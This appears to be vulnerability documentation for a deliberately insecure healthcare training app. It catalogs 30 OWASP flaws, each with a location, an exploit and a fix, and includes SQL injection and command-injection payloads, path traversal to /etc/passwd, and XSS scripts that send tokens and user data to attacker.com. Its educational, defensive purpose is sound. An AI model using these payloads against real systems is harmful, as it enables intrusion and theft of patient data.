# TechNova Health - Vulnerability Documentation

This document catalogs all intentional security vulnerabilities in the TechNova Health application for educational purposes.

## Vulnerability Summary

| Category | Count | Severity Distribution |
|----------|-------|----------------------|
| A01:2021 - Broken Access Control | 5 | Critical: 3, High: 2 |
| A02:2021 - Cryptographic Failures | 4 | Critical: 2, High: 2 |
| A03:2021 - Injection | 5 | Critical: 4, High: 1 |
| A05:2021 - Security Misconfiguration | 6 | High: 4, Medium: 2 |
| A07:2021 - Identification and Authentication Failures | 4 | Critical: 2, High: 2 |
| A08:2021 - Software and Data Integrity Failures | 2 | High: 2 |
| A09:2021 - Security Logging and Monitoring Failures | 2 | Medium: 2 |

**Total Vulnerabilities: 28**

---

## A01:2021 - Broken Access Control

### 1. Insecure Direct Object Reference (IDOR) - Medical Records

**Severity**: 🔴 Critical

**Location**: `backend/server.js:152-169`

**Description**: Users can access any patient's medical records by modifying the patient ID in the API request.

**Exploitation**:
```bash
# As patient001 (ID 9), access patient002's records
curl -H "Authorization: Bearer <token>" \
  http://localhost:3001/api/records/patient/2
```

**Impact**: Complete breach of patient confidentiality, HIPAA violation

**Remediation**:
```javascript
// Check if user has permission to access this patient's records
app.get('/api/records/patient/:patientId', authenticate, async (req, res) => {
  const { patientId } = req.params;

  // Verify authorization
  if (req.user.role === 'patient') {
    const userPatientId = await getUserPatientId(req.user.id);
    if (patientId !== userPatientId.toString()) {
      return res.status(403).json({ error: 'Access denied' });
    }
  } else if (req.user.role !== 'doctor' && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Access denied' });
  }

  // Proceed with query...
});
```

---

### 2. IDOR - User Information

**Severity**: 🔴 Critical

**Location**: `backend/server.js:132-148`

**Description**: Any authenticated user can retrieve any other user's complete information including passwords.

**Exploitation**:
```bash
# Access admin user data
curl -H "Authorization: Bearer <token>" \
  http://localhost:3001/api/users/1
```

**Impact**: Full user enumeration, password exposure, privilege information disclosure

**Remediation**: Implement proper authorization checks and never return passwords in API responses.

---

### 3. Mass Assignment - Privilege Escalation

**Severity**: 🔴 Critical

**Location**: `backend/server.js:150-167`

**Description**: Users can update any field in their user record, including the `role` field, allowing privilege escalation.

**Exploitation**:
```bash
# Escalate from patient to admin
curl -X PUT http://localhost:3001/api/users/9 \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

**Impact**: Complete system compromise, unauthorized administrative access

**Remediation**:
```javascript
// Whitelist allowed fields
const allowedUpdates = ['first_name', 'last_name', 'phone', 'email'];
const updates = {};
for (const field of allowedUpdates) {
  if (req.body[field]) {
    updates[field] = req.body[field];
  }
}
```

---

### 4. Missing Authorization on Patient Search

**Severity**: 🟠 High

**Location**: `backend/server.js:171-187`

**Description**: The patient search endpoint doesn't verify if the user should have access to search patients.

**Exploitation**: Any authenticated user (including patients) can search for and view other patients' sensitive data.

**Remediation**: Restrict search functionality to doctors and admin users only.

---

### 5. Broken Function Level Authorization - Admin Endpoints

**Severity**: 🟠 High

**Location**: `backend/server.js:280-295`

**Description**: Admin endpoints only check the `role` from the JWT token, which can be tampered with.

**Exploitation**: Modify JWT payload to include `"role": "admin"` and access admin endpoints.

**Remediation**: Always verify role from database, never trust client-provided tokens alone.

---

## A02:2021 - Cryptographic Failures

### 6. Plaintext Password Storage

**Severity**: 🔴 Critical

**Location**: `database/init/01-schema.sql:12`, `backend/server.js:58-79`

**Description**: User passwords are stored in plaintext in the database.

**Exploitation**:
```sql
SELECT username, password FROM users;
-- Returns all passwords in plaintext
```

**Impact**: Complete credential compromise if database is breached

**Remediation**:
```javascript
const bcrypt = require('bcrypt');

// Hash password before storing
const hashedPassword = await bcrypt.hash(password, 10);

// Verify password
const isValid = await bcrypt.compare(password, hashedPassword);
```

---

### 7. Weak JWT Secret

**Severity**: 🔴 Critical

**Location**: `backend/server.js:50`

**Description**: JWT secret is weak and hardcoded: `super_secret_key_123`

**Exploitation**: Attacker can generate valid tokens for any user.

**Remediation**: Use strong, randomly generated secrets stored in environment variables.

---

### 8. SSN Stored in Plaintext

**Severity**: 🟠 High

**Location**: `database/init/01-schema.sql:25`

**Description**: Social Security Numbers are stored unencrypted in the database.

**Impact**: Massive PII breach, identity theft risk

**Remediation**: Encrypt sensitive PII at rest, use column-level encryption or application-level encryption.

---

### 9. Passwords Returned in API Responses

**Severity**: 🟠 High

**Location**: `backend/server.js:74`

**Description**: Login endpoint returns the plaintext password in the response.

**Exploitation**: Check network tab in DevTools after login to see your password.

**Remediation**: Never include passwords in API responses. Use a data transformation layer.

---

## A03:2021 - Injection

### 10. SQL Injection - Login

**Severity**: 🔴 Critical

**Location**: `backend/server.js:58`

**Description**: Login endpoint uses string concatenation for SQL queries.

**Exploitation**:
```
Username: admin' OR '1'='1'--
Password: anything
```

**Impact**: Authentication bypass, data exfiltration, data manipulation

**Remediation**: Use parameterized queries (prepared statements).

---

### 11. SQL Injection - Patient Search

**Severity**: 🔴 Critical

**Location**: `backend/server.js:177-182`

**Description**: Search query uses string interpolation.

**Exploitation**:
```
Query: ' OR 1=1 UNION SELECT id, username, password, email, NULL, NULL, NULL FROM users--
```

**Impact**: Full database extraction

**Remediation**: Use parameterized queries.

---

### 12. Command Injection - Backup Function

**Severity**: 🔴 Critical

**Location**: `backend/server.js:287-296`

**Description**: Backup endpoint executes shell commands with user input.

**Exploitation**:
```bash
curl -X POST http://localhost:3001/api/admin/backup \
  -H "Authorization: Bearer <admin-token>" \
  -H "Content-Type: application/json" \
  -d '{"filename": "backup.sql; cat /etc/passwd"}'
```

**Impact**: Remote code execution, full system compromise

**Remediation**: Never execute user input as shell commands. Use safe libraries.

---

### 13. XSS - Message System

**Severity**: 🔴 Critical

**Location**: `frontend/src/pages/Messages.js:106`

**Description**: Message content is rendered without sanitization using `dangerouslySetInnerHTML`.

**Exploitation**:
```html
<script>
  fetch('/api/admin/users', {
    headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') }
  })
  .then(r => r.json())
  .then(data => {
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>
```

**Impact**: Session hijacking, credential theft, account takeover

**Remediation**: Use DOMPurify to sanitize HTML before rendering.

---

### 14. Path Traversal - File Download

**Severity**: 🟠 High

**Location**: `backend/server.js:229-240`

**Description**: File download endpoint doesn't validate the filename parameter.

**Exploitation**:
```bash
curl http://localhost:3001/api/records/download/../../../../etc/passwd
```

**Impact**: Arbitrary file read from server filesystem

**Remediation**: Validate and sanitize filenames, use allowlist of permitted files.

---

## A05:2021 - Security Misconfiguration

### 15. SSH Private Key in Repository

**Severity**: 🟠 High

**Location**: `ssh-keys/id_rsa`

**Description**: SSH private key is committed to version control.

**Exploitation**:
```bash
git clone <repo>
ssh -i ssh-keys/id_rsa technova@localhost -p 2222
```

**Impact**: Unauthorized SSH access to backend container

**Remediation**: Never commit secrets. Use `.gitignore`, secret scanning tools.

---

### 16. Debug Endpoints in Production

**Severity**: 🟠 High

**Location**: `backend/server.js:299-318`

**Description**: Debug endpoints expose environment variables and configuration.

**Exploitation**:
```bash
curl http://localhost:3001/api/debug/env
curl http://localhost:3001/api/debug/config
```

**Impact**: Exposure of database credentials, API keys, secrets

**Remediation**: Remove debug endpoints or protect with additional authentication and environment checks.

---

### 17. Overly Permissive CORS

**Severity**: 🟠 High

**Location**: `backend/server.js:18-22`

**Description**: CORS allows any origin (`*`).

**Impact**: Enables CSRF attacks and unauthorized cross-origin requests

**Remediation**: Restrict CORS to specific trusted origins.

---

### 18. Missing Security Headers

**Severity**: 🟠 High

**Location**: `backend/server.js:27`

**Description**: Helmet middleware is commented out.

**Impact**: Missing CSP, X-Frame-Options, etc. enables various attacks

**Remediation**: Enable Helmet with appropriate configuration.

---

### 19. Weak Credentials

**Severity**: 🟡 Medium

**Location**: `database/init/02-seed-data.sql`, `docker-compose.yml`

**Description**: Default credentials are weak and documented.

**Examples**:
- admin/admin123
- root password: technova123
- Redis password: redis123

**Remediation**: Enforce strong password policies, rotate credentials regularly.

---

### 20. Exposed Services

**Severity**: 🟡 Medium

**Location**: `docker-compose.yml`

**Description**: Database, Redis, and MinIO exposed on default ports.

**Impact**: Direct access to data stores from network

**Remediation**: Use internal Docker networks, don't expose unnecessary ports.

---

## A07:2021 - Identification and Authentication Failures

### 21. No JWT Expiration

**Severity**: 🔴 Critical

**Location**: `backend/server.js:64-71`

**Description**: JWT tokens are issued without expiration time.

**Impact**: Stolen tokens remain valid indefinitely

**Remediation**:
```javascript
const token = jwt.sign(payload, JWT_SECRET, { expiresIn: '1h' });
```

---

### 22. No Rate Limiting

**Severity**: 🔴 Critical

**Location**: `backend/server.js:52`

**Description**: No rate limiting on authentication endpoints.

**Impact**: Brute force attacks, credential stuffing

**Remediation**: Implement rate limiting on login and sensitive endpoints.

---

### 23. Predictable Session Tokens

**Severity**: 🟠 High

**Location**: `backend/server.js:73-78`

**Description**: Session tokens use predictable format: `sess_{user_id}_{timestamp}`

**Exploitation**: Guess or enumerate session tokens

**Remediation**: Use cryptographically secure random tokens.

---

### 24. Credentials in Logs

**Severity**: 🟠 High

**Location**: `backend/server.js:60`

**Description**: SQL queries with credentials are logged to console.

**Impact**: Password exposure in log files

**Remediation**: Never log sensitive data, sanitize logs.

---

## A08:2021 - Software and Data Integrity Failures

### 25. Vulnerable Dependencies

**Severity**: 🟠 High

**Location**: `backend/package.json`, `frontend/package.json`

**Description**: Using outdated packages with known vulnerabilities.

**Examples**:
- axios@0.21.1 (CVE-2021-3749)
- lodash@4.17.19 (CVE-2020-8203)

**Exploitation**: Run `npm audit` to see all vulnerabilities

**Remediation**: Keep dependencies updated, use automated scanning.

---

### 26. No Input Validation

**Severity**: 🟠 High

**Location**: Multiple endpoints

**Description**: User inputs are not validated before processing.

**Impact**: Various injection attacks, data corruption

**Remediation**: Implement input validation using libraries like Joi or express-validator.

---

## A09:2021 - Security Logging and Monitoring Failures

### 27. Incomplete Audit Logging

**Severity**: 🟡 Medium

**Location**: `database/init/01-schema.sql:60-67`

**Description**: Audit log exists but is not consistently populated.

**Impact**: Cannot detect or investigate security incidents

**Remediation**: Log all security-relevant events comprehensively.

---

### 28. Detailed Error Messages

**Severity**: 🟡 Medium

**Location**: Multiple locations, e.g., `backend/server.js:80-82`

**Description**: Error responses include stack traces and internal details.

**Impact**: Information leakage aids attackers

**Remediation**: Return generic error messages, log details server-side only.

---

## Additional Security Issues

### 29. No HTTPS

**Description**: Application runs over HTTP, not HTTPS.

**Impact**: Man-in-the-middle attacks, credential interception

**Remediation**: Use TLS/SSL certificates, enforce HTTPS.

---

### 30. Client-Side Security Decisions

**Location**: `frontend/src/App.js:14-20`

**Description**: Authorization checks based on client-side user object.

**Impact**: Can be bypassed by modifying localStorage

**Remediation**: Always enforce authorization server-side.

---

## Exploitation Workflow Examples

### Full Attack Chain #1: Patient to Admin

1. **Reconnaissance**: Discover debug endpoint
   ```bash
   curl http://localhost:3001/api/debug/config
   ```

2. **Authentication**: SQL injection login
   ```
   Username: admin' OR '1'='1'--
   Password: anything
   ```

3. **Privilege Escalation**: Mass assignment
   ```bash
   curl -X PUT http://localhost:3001/api/users/9 \
     -H "Authorization: Bearer <token>" \
     -d '{"role": "admin"}'
   ```

4. **Data Exfiltration**: Access all patient data
   ```bash
   curl http://localhost:3001/api/admin/users
   ```

### Full Attack Chain #2: XSS to Account Takeover

1. **Stored XSS**: Send malicious message
   ```html
   <img src=x onerror="fetch('http://attacker.com/steal?token='+localStorage.getItem('token'))">
   ```

2. **Session Hijacking**: Use stolen token
   ```bash
   curl -H "Authorization: Bearer <stolen-token>" \
     http://localhost:3001/api/admin/users
   ```

3. **Persistence**: Create backdoor admin account

---

## Testing Checklist

Use this checklist to verify all vulnerabilities are exploitable:

- [ ] SQL Injection - Login bypass
- [ ] SQL Injection - Data exfiltration
- [ ] Command Injection - RCE via backup
- [ ] XSS - Alert popup in messages
- [ ] XSS - Session token theft
- [ ] IDOR - Access other user profiles
- [ ] IDOR - Access other patient records
- [ ] Mass Assignment - Role escalation
- [ ] Path Traversal - Read /etc/passwd
- [ ] SSH with committed key
- [ ] Access debug endpoints
- [ ] Verify plaintext passwords in DB
- [ ] Verify no JWT expiration
- [ ] Brute force (no rate limiting)
- [ ] Find vulnerable dependencies with npm audit

---

## Remediation Priority

### Critical (Fix Immediately)
1. Plaintext passwords → Bcrypt hashing
2. SQL Injection → Parameterized queries
3. Command Injection → Remove or sanitize
4. Mass Assignment → Field whitelisting
5. IDOR → Authorization checks

### High (Fix Soon)
6. XSS → DOMPurify sanitization
7. SSH keys in repo → Remove, rotate
8. Debug endpoints → Disable in production
9. Weak JWT → Strong secret + expiration
10. No rate limiting → Implement throttling

### Medium (Fix Eventually)
11. Missing security headers → Enable Helmet
12. Weak credentials → Password policy
13. Incomplete logging → Comprehensive audit log
14. Vulnerable dependencies → Update packages

---

**Note**: This is an educational environment. In a real application, ALL vulnerabilities would be considered critical and require immediate remediation.
